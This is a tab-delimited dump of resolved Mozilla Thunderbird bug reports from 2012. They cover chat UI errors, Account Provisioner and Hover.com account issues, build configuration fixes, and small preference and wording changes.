767897%TAB%1340582313%TAB%160105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End,Instant Messaging%TAB%Change access key of joinChatMenuItem%TAB%Change access key of joinChatMenuItemAt the moment the new "Join Chat" menu option under Tools uses the letter "O" as its access key. The letter "O" was always used for Options. Instead of using Alt-T+O to go to options, I now how to type Alt-T+O+O+Enter.  Please change the access key of Join Chat to something else, like J, which isn't used in the standard Tools menu...  comm-central/mail/locales/en-US/chrome/messenger/messenger.dtd: --- <!ENTITY joinChatCmd.accesskey "o"> +++ <!ENTITY joinChatCmd.accesskey "J">
767655%TAB%1340387801%TAB%360347%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%New messages arrive sound file browser wont select ogg files%TAB%New messages arrive sound file browser wont select ogg filesDebian Sid 64 bit, running XFCE with a little bit of Gnome here and there, Thunderbird Daily 16.0a1 (2012-06-19).  Steps to reproduce 1. Make the most amazing recording of a baby bird chipping through an egg shell and record it as an ogg file 2. Load up a recent daily build of Thunderbird 3. Go to preferences, general tab 4. Select Play Sound, Use the following sound file 5. Click Browse 6. Locate your amazing baby bird chipping ogg file 7. Observe  Expect result Ogg file is selectable through the file browser  Actual result Only *.wav files can be display in the file browser  Notes Thunderbird seems fine with playing ogg files, tested by simply renaming the more amazing recording from .ogg to .wav. Thunderbird plays it like a champ.
767155%TAB%1340281619%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%JS error when the contact of an ongoing conversation signs off%TAB%JS error when the contact of an ongoing conversation signs off[Exception... "'Removing a contact that isn't here?' when calling method: [nsIObserver::observe]"  nsresult: "0x8057001e (NS_ERROR_XPC_JS_THREW_STRING)"  location: "JS frame :: file:///Users/florian/buildhg/comm-central/obj-tbird/mozilla/dist/DailyDebug.app/Contents/MacOS/components/imContacts.js :: <TOP_LEVEL> :: line 857"  data: no]   When an account signs off, we try to remove all of its contacts from the "online contacts" group to add them in the "offline contacts" group. However, it's possible that the contact wasn't listed in the "online contacts" group if there was an ongoing conversation with that contact.  This actually has a visible effect in addition to the error in the console: when a contact of an ongoing conversation signs-off, the contact is added in the "Offline Contacts" group and then when the contact signs back on, it appears in the "Online Contacts" group; so we have duplicated contacts in the list.
767150%TAB%1340281088%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-cloudfile-attachment-item.js | test-cloudfile-attachment-item.js::test_upload_cancel_repeat%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-cloudfile-attachment-item.js | test-cloudfile-attachment-item.js::test_upload_cancel_repeatSeeing this pretty consistently on our Linux 64 Mozmill machines:  SUMMARY-UNEXPECTED-FAIL | test-cloudfile-attachment-item.js | test-cloudfile-attachment-item.js::test_upload_cancel_repeat   EXCEPTION: Context menu has been opened.     at: utils.js line 447        TimeoutError utils.js 447        waitFor utils.js 485        assert_can_cancel_upload test-cloudfile-attachment-item.js 155        test_upload_cancel_repeat test-cloudfile-attachment-item.js 85  Based on when we first started seeing this failure, and what kind of commits went into comm-central, I'm going to go out on a limb here and wager that mozilla-central broke us.
766834%TAB%1340217169%TAB%108384%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%TB-IM Status tooltips not updated for chats without status%TAB%TB-IM Status tooltips not updated for chats without statusSTR: 1. Open a chat with somebody with a status (e.g. #developers on irc.m.o, where the status is the channel topic) 2. Open a chat with somebody without a status (e.g. NickServ on irc.m.o) in the same window/tab 3. Hover the mouse cursor over the "Unknown" status, below the contact name  Expected results: No tooltip, or a tooltip saying "Status unknown", or something  Actual results: A tooltip shows, containing the status of the last displayed conversation that had one (in this case, the topic for #developers)  Mozilla/5.0 (X11; Linux x86_64; rv:16.0) Gecko/16.0 Thunderbird/16.0a1 20120620030201
765556%TAB%1339894249%TAB%372329%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Allow to disable gconf%TAB%Allow to disable gconfm-c allows to disable building against gconf (see http://mxr.mozilla.org/mozilla-central/source/configure.in#5015), c-c could allow doing the same. Atm, if you build against gtk2, gconf is enabled inconditionally (see http://mxr.mozilla.org/comm-central/source/configure.in#4863) and there's no way to disable it.  Is there any particular reason ? If not, i'll do a patch..
764742%TAB%1339632479%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mail Window Front End%TAB%Thunderbird shows reference count leaks on shutdown%TAB%Thunderbird shows reference count leaks on shutdownSometime between Thunderbird 10 and 14, we started showing a whole lot of refcount leaks on shutdown. We missed this because we haven't been running reference count checks on our bloat builds, and we've not got UI based coverage for refcount leaks. I'll file a follow-up bug for that.  We're leaking global windows, so it is possible that we've got observer services holding onto windows that we're not tidying up on shutdown.  An example log is attached, this was generated via "make mailbloat" on a trunk build.
764312%TAB%1339549559%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window,FileLink%TAB%Filelink UbuntuOne: cannot upload file with filenames containing '(' or ')'%TAB%Filelink UbuntuOne: cannot upload file with filenames containing '(' or ')'Tried to filelink 'Agreement (clean).doc' to UbuntuOne and got an 'Upload error' dlg, saying "Unable to upload Agreement (clean).doc to Ubuntu One." This appears to be a problem with the OAuth signature on the request.  I was able to successfully attach a file with parentheses in its name after hacking oauth.jsm to write out a PLAINTEXT OAuth signature instead of HMAC-SHA1.  I'm still investigating to see which side the problem lies.
764245%TAB%1339521900%TAB%108384%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Smilies should have tooltips displaying the untransformed text%TAB%Smilies should have tooltips displaying the untransformed textThis is the IM equivalent of bug 234638. When my mouse hovers over smilies/emoticons, it would be nice to show the original text as a tooltip.  It seems like the images already have a title= attribute, it's just not set up to display them at the moment.  (This was mostly tested against IRC.)
764054%TAB%1339492443%TAB%29811%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%visually distinguish / separate menu bar and toolbar%TAB%visually distinguish / separate menu bar and toolbarmenu bar and toolbar seem like one big mass. in my case, a mass of blue (see screen shot), which makes it hard to find the menu bar.  need to visually distinguish / separate menu bar and toolbar - with shades of color, or divider, or both.
763988%TAB%1339485129%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Account Manager%TAB%Make Account Provisioner compare providers against general.useragent.locale instead of any values of intl.accept_languages%TAB%Make Account Provisioner compare providers against general.useragent.locale instead of any values of intl.accept_languagesThe Account Provisioner dialog currently compares each returned provider's supported locales against each locale in intl.accept_languages. This way, we only show the providers that support the user's locale.  It turns out that this is meaningless, since en-US is always included in intl.accept_languages.  We should use general.useragent.locale instead.  Also, we should special case "*" to mean that a provider supports all locales.
763866%TAB%1339462250%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%JavaScript strict warning: reference to undefined property this._displayedLog%TAB%JavaScript strict warning: reference to undefined property this._displayedLogThere's a JS strict warning in my error console when I display a previous conversation for the first time after restarting Tb: Warning: ReferenceError: reference to undefined property this._displayedLog Source File: chrome://messenger/content/chat/chat-messenger-overlay.js Line: 369
763857%TAB%1339460160%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Stop printing chat debug messages by default on debug builds%TAB%Stop printing chat debug messages by default on debug buildsSomeone on #maildev complained about the noise that these messages generate in the terminal. I'm not completely sure of the use case for running a Thunderbird debug build with chat accounts configured and connected if the developer isn't debugging something related to chat at the moment, but I generally agree that less noise in debug builds is better.
763522%TAB%1339399507%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Show presence information in email headers%TAB%Show presence information in email headersThe attached patch will display the green dot icon next to names of online contacts, and the red dot icon next to away/unavailable contacts. No presence icon will be displayed for offline contacts or email addresses for which we don't know the chat username.  The chat username used for the presence detection is either the email address itself, or the Gtalk or Jabber Id field of the address book card; if one exists.  The chat username we will use is displayed in a tooltip on the first line, and the status is displayed on the second line.  Clicking the presence icon will open or select the Chat tab, and create or select & focus the conversation for this contact.
763494%TAB%1339394332%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Account Provisioner: Allow different prices / provider%TAB%Account Provisioner: Allow different prices / providerSome providers have different offers, with different prices.  The suggestion API should allow the display of different prices sections.  A quick hack, in the interim, would consist of duplicating a provider manifest and make it point to a different URL, depending on the targeted offer.
763471%TAB%1339389932%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General,FileLink%TAB%Convert Dropbox Filelink provider code to addon%TAB%Convert Dropbox Filelink provider code to addonLet's review the options and timing so we can release it fully localized. TB15 or 16 seem a good target.  This is also a good opportunity to show how to make a Filelink addon.
763394%TAB%1339368330%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Toolbars and Tabs%TAB%Black line line around tabs%TAB%Black line line around tabsUpdating from 13 to 14 on mac osx make the tab really look ugly as they have a big black border. This was fixed for 13b1 but it seems it cames back in 13.
763308%TAB%1339307970%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Implement Australis tabs with Firefox tab construct%TAB%Implement Australis tabs with Firefox tab constructWe should make the tab construct like the one from Firefox. Firefox is using a stack in the tab to separate the background (for the tab shape) and the content (for the icon, the text and the close button).  With this we can style the Australis tabs similar to Fx. Also the tab shrink and overflow is working correctly.
762901%TAB%1339132291%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Remove references to chrome://mozapps/content/preferences/preferences.css%TAB%Remove references to chrome://mozapps/content/preferences/preferences.cssI'm seeing this warning each time I open the preferences window of a Thunderbird debug build: Chrome file doesn't exist: /Users/florian/buildhg/comm-central/obj-tbird/mozilla/dist/DailyDebug.app/Contents/MacOS/chrome/toolkit/content/mozapps/preferences/preferences.css  This file has been removed from the toolkit in bug 459372 in 2008 and we still have references to it!  Note: SeaMonkey did this in bug 509240.
762594%TAB%1339059954%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Prompts to save unmodified message forward draft%TAB%Prompts to save unmodified message forward draftIf I click the Forward button on a message, and then immediately try to close the window, TB asks me if I want to save it.  I'm fairly certain this is new behavior. If I haven't modified the draft after clicking the Forward button, then it shouldn't be prompting me, and I don't think it has in the past.  I'm marking this as a regression. Feel free to remove the keyword if I'm wrong about the previous behavior, but I don't think I am.
762508%TAB%1339050427%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%Remove defunct abCardViewOverlay.dtd file%TAB%Remove defunct abCardViewOverlay.dtd fileSome time in history abCardViewOverlay.xul was merged into addressbook.xul and abCardViewOverlay.dtd into abMainWindow.dtd. abCardViewOverlay.xul was removed but abCardViewOverlay.dtd wasn't.
762129%TAB%1338971484%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Wrong behavior of the Participants/Previous conversations splitter when moved all the way to the top/bottom%TAB%Wrong behavior of the Participants/Previous conversations splitter when moved all the way to the top/bottomCurrently moving the splitter between the list of participants and the list of previous conversations all the way to the bottom makes a vertical scrollbar appear, and moving it all the way to the top moves the "Participants" header into the toolbar displaying the conversation title and topic.  This can easily be fixed by adding another vbox to limit how much the splitter can move the lists to the top, and adding overflow:hidden to it to avoid the scrollbar.
762033%TAB%1338958267%TAB%306157%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Daily has a new renovated (no) interface%TAB%Daily has a new renovated (no) interfaceUser Agent: Mozilla/5.0 (X11; Linux x86_64; rv:14.0) Gecko/20120604 Firefox/14.0a2 Build ID: 20120604042007  Steps to reproduce:  Update Daily to the last trunk version. Restart Daily.   Actual results:  Daily got a new clean renovated UI, which I attach as a file. No way to read the mail nor openning the chats.   Expected results:  Daily should continue with a practical, at least usable, user interface.
761983%TAB%1338949570%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Search%TAB%JS error when closing the Thunderbird main window in a removeObserver in search.xml,JS error when closing the Thunderbird main window in a removeObserver call in search.xml%TAB%JS error when closing the Thunderbird main window in a removeObserver in search.xml,JS error when closing the Thunderbird main window in a removeObserver call in search.xmlJavaScript error: , line 0: uncaught exception: [Exception... "Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIObserverService.removeObserver]"  nsresult: "0x80004005 (NS_ERROR_FAILURE)"  location: "JS frame :: chrome://messenger/content/search.xml ::  :: line 156"  data: no]  We currently have more than one search field in the UI (there's one on the 3 pane mail tab, one on the chat tab, and an additional one per open search tab), we have this error when closing the window once for each search field that wasn't the one of the 3 pane mail tab.  It seems the code causing this error was added in bug 515803 to workaround bug 83635 which is now fixed.  Reverting the changes from bug 515803 lets each search box have its own observer, so that removing it doesn't fail when the destructor is called (as it now seems to be called reliably! :)).  However, when selecting a proposed completion from the autocomplete popup, each observer receives the notification and opens a gloda search tab, which is undesirable. I've added a check on the value of aSubject in the observe method to prevent this.  (CC'ing davida who fixed bug 515803, so that he can tell me if I misunderstood the situation.)
761970%TAB%1338945741%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Warning about missing mail-toolbar-small.png file in pinstripe%TAB%Warning about missing mail-toolbar-small.png file in pinstripeI see this message twice in my terminal when starting a Mac debug build:  Chrome file doesn't exist: /Users/florian/buildhg/comm-central/obj-tbird/mozilla/dist/DailyDebug.app/Contents/MacOS/chrome/classic/skin/classic/messenger/icons/mail-toolbar-small.png  This file is referenced 3 times in the css files of the Mac theme, but doesn't exist: http://mxr.mozilla.org/comm-central/search?string=mail-toolbar-small.png&find=pinstripe&findi=&filter=^[^\0]*%24&hitlimit=&tree=comm-central
761961%TAB%1338941846%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Typing 8 when a message is selected produces an error in the console%TAB%Typing 8 when a message is selected produces an error in the consoleSelect a message , press 8  in the error console you get the following error  Timestamp: 6/6/12 11:13:48 AM Error: An error occurred executing the cmd_tag8 command: TypeError: tagArray[keyNumber - 1] is undefined Source File: chrome://global/content/globalOverlay.js Line: 79
761797%TAB%1338900022%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%make the Preferences (options) menu item in Addressbook open the Composition panel and Addressing tab in the preferences dialog%TAB%make the Preferences (options) menu item in Addressbook open the Composition panel and Addressing tab in the preferences dialogMake the Preferences (options) menu item in Addressbook open the Composition panel and Addressing tab in the preferences dialog. Currently it opens any panel/tab the user had open previously. The same approach is already used in Compose window, which opens the Composition panel (no specific tab). Of course the user is then free to switch to any other panel/tab.  Bug 718139 will provide the infrastructure for this, in this bug I wire up this specific panel + tab.
761688%TAB%1338884155%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%JS error at shutdown when calling nsIControllers.removeController from convbrowser.xml%TAB%JS error at shutdown when calling nsIControllers.removeController from convbrowser.xmlWe have this JS error when closing Thunderbird if no conversation log has been displayed.  JavaScript error: , line 0: uncaught exception: [Exception... "Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIControllers.removeController]"  nsresult: "0x80004005 (NS_ERROR_FAILURE)"  location: "JS frame :: chrome://chat/content/convbrowser.xml :: destroy :: line 243"  data: no]  The cause is that the controller is only added when the document of the conversation is loaded; which never happens if the convbrowser used to display logs is never used.
761654%TAB%1338880921%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%"Always load remote content from [address]" link in the preview pane is failing,"Always load remote content from [address]" link in the preview pane is failing when displayName isn't set%TAB%"Always load remote content from [address]" link in the preview pane is failing,"Always load remote content from [address]" link in the preview pane is failing when displayName isn't setIn trunk (updated and built from the repository today), when I get an email with embedded images from a sender whose remote content is not trusted and isn't in my address book, and I click the "Always load remote content from [address]" link in the preview pane to add them to my address book with remote images enabled, the add contact window that pops up doesn't have the email address filled in properly.  This works fine in Thunderbird 12.0.1.  I see this error in my error console when I click on the link (don't know if it's relevant);  Timestamp: 06/05/2012 12:17:24 PM Error: TypeError: gEditCard.card.displayName is null Source File: chrome://messenger/content/addressbook/abCardOverlay.js Line: 115
761443%TAB%1338821153%TAB%99568%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%"End User Rights" Should Be "End-User Rights"%TAB%"End User Rights" Should Be "End-User Rights"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120428 Thunderbird/12.0.1  If I select [Help > About Thunderbird] from the menubar, I get the About Mozilla Thunderbird popup.  At the bottom of that popup are three links: "Licensing Information", "End User Rights", and "Privacy Policy".  "End User Rights" sounds as if it terminates the rights of the user.  This should instead be "End-User Rights" with a hyphen.
761415%TAB%1338817250%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Start page: blog section wrapping not aligned%TAB%Start page: blog section wrapping not alignedUnder certain circumstances of width setting, the Mozilla blog feed paragraph title wraps below the icon.  The expected behaviour would be to have the paragraph wrapping up within its own 'column'  Well, this is really due to layout limitations when dealing with an unknown amount of text. Anne-Marie didn't like it when there was any wrapping at all in the title, so I did my best to prevent it from ever wrapping, and that's what happens when it ends up too long. I can change it back, though that has other compromises with vertical spacing/centering.   It's really best to avoid titles that are extremely long, as they're never going to look quite right on this layout design.
761028%TAB%1338725962%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Remove remaining references to Mozilla Messaging as a company name and update some more mozillamessaging.com links%TAB%Remove remaining references to Mozilla Messaging as a company name and update some more mozillamessaging.com linksThere are still a couple of references to Mozilla Messaging in executables:  http://mxr.mozilla.org/comm-central/search?string=Mozilla+Messaging  The ones in module.ver & branding.nsi need updating to match the same as in the equivalent files in Firefox.  We also should fix some more urls to point direct to mozilla.org rather than mozillamessaging.org:  http://mxr.mozilla.org/comm-central/search?string=www.mozillamessaging&find=&findi=&filter=^[^\0]*%24&hitlimit=&tree=comm-central
760704%TAB%1338556169%TAB%282357%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Search%TAB%GloDa search stays on "Searching...",GloDa search stays on "Searching...".   Error: ReferenceError: aTab is not defined  //app/modules/gloda/datastore.js%TAB%GloDa search stays on "Searching...",GloDa search stays on "Searching...".   Error: ReferenceError: aTab is not defined  //app/modules/gloda/datastore.jsWhen I'm doing a GloDa search the first time the Search tab opens but it stays with the text "Searching...". The error console shows: Error: ReferenceError: aTab is not defined Source file: resource://app/modules/gloda/datastore.js Line: 387  After closing this tab and re-searching the results appearing immediately.  When the search is working, I can close and restart TB and it is still working. I'm not searching a lot but usually when I'm searching this bug occurs. I'll check if after updating Daily the bug appears again.  I'm not sure if this is related because it appears also when the search is working: Error: NS_ERROR_FAILURE: Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIObserverService.removeObserver] Source file: chrome://messenger/content/search.xml Line: 120
760624%TAB%1338544434%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Changed Hover.com password results in Thunderbird saying that there is a network problem.%TAB%Changed Hover.com password results in Thunderbird saying that there is a network problem.When I change my Mailbox password (through Hover) The next time I go into Thunderbird,  it gives that message "Server <email@address.com>  has disconnected.  The server may have gone down or there may be a network problem."   instead of prompting for the password again (like it would do before, when no password was being set at all).
760390%TAB%1338509809%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Thunderbird release mozconfigs should take revision arguments from the environment%TAB%Thunderbird release mozconfigs should take revision arguments from the environmentIn the ESR release build, we realised client.py wasn't being passed the revision of mozilla-* to be building with. This was causing the wrong gecko version to be reported in the final binary build, and could lead to confusion in beta/release builds in future (different things included than expected).  The simple fix to this is to add --comm-rev=${COMM_REV} --mozilla-rev=${MOZILLA_REV} to the release mozconfigs on the CLIENT_PY_ARGS line. The release binary builders already have the relevant items set in the environment.
760117%TAB%1338443493%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Port Bug 751695 - Make our builders pick the correct mozconfig on Windows based on whether they're on a 32-bit or a 64-bit platform%TAB%Port Bug 751695 - Make our builders pick the correct mozconfig on Windows based on whether they're on a 32-bit or a 64-bit platform+++ This bug was initially created as a clone of Bug #751695 +++  Thunderbird needs to keep up with the changes for the builders where Firefox is now starting to do build Win32 builds on Win64 builders.  We need to port the mozconfig changes from bug 751611 and bug 751695 to comm-central to let this happen for Thunderbird as well.
760079%TAB%1338436265%TAB%198415%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Attachment box should be wider%TAB%Attachment box should be widerUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0.1) Gecko/20100101 Firefox/8.0.1 Build ID: 20111120135848  Steps to reproduce:  from http://gsfn.us/t/2w3e0  When I add an attachment to an email a very small window appears in the top right hand side of the email. How can I make this window wider, not longer as I don't add many attachments just the attachment names are long   Actual results:  The attachment filename is very often truncated   Expected results:  The attachment box should be taller, or auto adapt to the attachment's filename. We give too many space for email address, and not enough for the attachment's name.
759816%TAB%1338366721%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Remove license headers from HTML template files that are used for each message%TAB%Remove license headers from HTML template files that are used for each messagehttps://hg.mozilla.org/comm-central/rev/84ac3c711098 added license headers in all HTML files of the message theme used by Thunderbird. I think we should revert that change for all the HTML template files (except maybe Footer.html).
759758%TAB%1338357688%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Thunderbird sometimes switches back to inbox tab after opening the Account Provisioner tab%TAB%Thunderbird sometimes switches back to inbox tab after opening the Account Provisioner tabThis happens randomly it seems, but here are the STR:  1. Create a new Thunderbird profile 2. When the Account Provisioner dialog comes up, enter a search, and then choose an address when you find one. 3. Wait for the order form tab to open  What happens (sometimes)?  The inbox tab gets switched to suddenly, and the order form tab goes into the background.  What's expected?  We should fully focus the order form tab.  I can't seem to reproduce this reliably, so my guess is that this is a race of some kind.  I tried fixing this in an earlier patch by increasing the delay time for when the Account Provisioner dialog opens to 200ms to give the 3pane time to spin, but I guess that's sometimes not enough.
759744%TAB%1338355187%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Telemetry opt-in looks strange with default window size%TAB%Telemetry opt-in looks strange with default window sizeSTR:  1. On Windows 7, create a new Thunderbird profile 2. Set up an account, and close the "Know your rights" notification 3. Close and restart Thunderbird to show the Telemetry opt-in notification  What happens?  The notification looks a bit odd with the default window size - the buttons are cut off at the bottom, and the whole things looks crowded with the status bar. Kinda ugly.  See screenshot.  What's expected?  It should look better. :)
759699%TAB%1338341902%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%The MessagesDisplayed event is fired only for large conversations%TAB%The MessagesDisplayed event is fired only for large conversationsI messed up https://hg.mozilla.org/comm-central/diff/9849318c2099/chat/content/convbrowser.xml, causing the MessagesDisplayed event to be fired only when more messages will be displayed later. This prevents the changes from bug 754914 from working when the conversation is very small (displayed in a single chunk) or when the searched term is in the last chunk.
759673%TAB%1338331034%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Runnning with mail.chat.enabled to false makes global search results unclickable%TAB%Runnning with mail.chat.enabled to false makes global search results unclickableTimestamp: 05/30/2012 09:36:00 AM Error: Error: Unable to locate noun with name 'im-conversation', but I do know about: bool, number, string, date, fulltext, folder, account, conversation, message, contact, identity, attachment-infos, parameterized-identity, mime-type, tag, freetag Source File: resource:///modules/gloda/gloda.js Line: 995 
759451%TAB%1338286314%TAB%403756%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Account Manager%TAB%Accounts created through Hover.com do not appear to work correctly (passwords are incorrect?)%TAB%Accounts created through Hover.com do not appear to work correctly (passwords are incorrect?)STR:  1)  With a new profile, sign up for an account from Hover.com 2)  Once successfully created, try sending some mail  What happens?  Thunderbird tells me that the password (which Hover.com generated automatically) is incorrect and asks me if I want to retry. Since I don't know what my password is...retrying is pointless. And I'm stuck.  Also, when clicking on the Inbox, Thunderbird reports that:  "Server [address] has disconnected. The server may have gone down or there may be a network problem."  I can confirm that passwords were sent back by Hover.com - I can see them in the password manager. It just looks like Hover.com is not accepting them.  What's expected?  The passwords should work!
759328%TAB%1338268233%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%Add instant messaging fields to the address book cards%TAB%Add instant messaging fields to the address book cardsI think the attached patch follows Blake's recommendations. It adds a "Chat" tab to address book cards, where it's possible to set a username for: Google Talk, AIM, Yahoo, Skype, QQ, MSN, ICQ, Jabber. In the first ("Contact") tab, the old Screen Name field is gone, and at the same place there's a "Chat information" link that when clicked selects the "Chat" tab.  Requesting feedback from Blake (to check that the UI is what he expects) and David (to check that the way this touches the address book code isn't going to cause significant pains).   David, I saw that all the current fields are listed at http://mxr.mozilla.org/comm-central/source/mailnews/addrbook/public/nsIAbCard.idl#365 Do I need to add all the new IM fields in that list? I don't have a clear understanding of how this list is needed.  * I won't pretend to understand all the usages of kScreenNameProperty, except http://mxr.mozilla.org/comm-central/source/mailnews/addrbook/src/nsAbAddressCollector.cpp#278 (and we can probably do the same for @gmail.com @googlemail.com, @hotmail, @msn, and @live addresses)  * Are AIM screen names stored in ldap? http://mxr.mozilla.org/comm-central/source/mailnews/mailnews.js#311 Do we need something similar for other IM services?  * I also noticed http://mxr.mozilla.org/comm-central/source/mailnews/addrbook/src/nsAbOSXUtils.mm#136 that seems to be using Apple-defined constants to import things from the OS X address book. There are more similar constants documented at https://developer.apple.com/library/mac/#documentation/UserExperience/Reference/AddressBook/C/ABPersonRef/Reference/reference.html#//apple_ref/doc/c_ref/kABAIMInstantProperty and apparently OS X 10.7 supports even more: https://developer.apple.com/library/mac/#documentation/UserExperience/Reference/AddressBook/C/ABPersonRef/Reference/reference.html#//apple_ref/c/data/kABInstantMessageServiceAIM   Blake, the current address book shows the Screen Name in the card summary that's visible in the bottom part of the address book window when selecting a card. Do we need to change this to show all the IM fields that have a value?  There's currently an "Instant Message" context menu items on contacts (and it's also a toolbar button; hidden by default though) that just takes the AIM screen name and loads an aim:goim?screenname=<screenname> url through the external protocol service. I assume we want to change that, but what's the new expected behavior? Do we take into account which accounts the user has configured? The presence information we have of the contact? I don't think there's a known typical URL for all the IM services I have listed in the new "Chat" tab that this patch adds.
759327%TAB%1338267910%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Account Provisioner search button should be disabled if the search input is empty%TAB%Account Provisioner search button should be disabled if the search input is emptySTR:  1)  Create a new profile, and wait for the Account Provisioner to open  What happens?  The search button is enabled, even though the search input is empty.  What's expected?  If the search input is empty, searching should not be possible.  So it turns out that this bug is a regression caused by bug 758618 (oh boy).  This patch undoes bug 758618, and does things a bit better by using a built-in function that we should have been using instead.  I've added a test, and modified our older tests to make sure that they're typing manually into the text input, as opposed to poking the value in with jQuery.
759163%TAB%1338199550%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%If Account Provisioner tab is restorable on startup, the Account Provisioner dialog should not open.%TAB%If Account Provisioner tab is restorable on startup, the Account Provisioner dialog should not open.STR:  1. Create a fresh TB profile  2. When the Account Provisioner opens, type a search into the input and hit the Search button. 3. When a result comes up, choose one so that an Account Provisioner tab opens. 4. Quit and restart Thunderbird.  What happens?  The Account Provisioner dialog comes up again, and our old Account Provisioner tab is not opened.  The old tab will *only* be restored once the dialog is closed, which is not ideal.  What's expected?  Thunderbird should go back into the last state, where we had an Account Provisioner tab opened, so that the user can continue their transaction.
758803%TAB%1337949721%TAB%219761%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Enhance wording of compacting option%TAB%Enhance wording of compacting optionUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0 Build ID: 20120420145725  Steps to reproduce:  I worried about the wording in the options settings pane. At least the german translation does not clearly describe the fact, that the threshold is meant as sum over all folders, because in german the plural form for 'folder' is the same than the singular form.    Actual results:  The german translation in options of: "Compact folder, if that saves more space than x MB" IMO is ambiguous. It's not clear, if ... that is meant as sum over all folders rather than space per folder. ... only that big folders are compacted at all.    Expected results:  If you would add the words 'all' and 'in sum', also the german (and maybe others too) translation would be unambiguously clear: "Compact all folders, if that saves more space in sum than x MB"
758777%TAB%1337946862%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Account Provisioner tab should still act normally if the session was restarted,Account Provisioner tab should still act normally if persisted and restored%TAB%Account Provisioner tab should still act normally if the session was restarted,Account Provisioner tab should still act normally if persisted and restoredSTR:  1. Go to File > New > Get a New Mail Account 2. Do a search with Hover.com, choose a result. 3. When the order form tab opens, quit Thunderbird. 4. Restart Thunderbird, and complete your order.  What happens?  The XML listener doesn't get re-attached when the session is restored, so the user sees the XML.  What's expected?  The tab should work as expected, and create the account or head back to the Account Provisioner dialog when it sees XML being passed back.
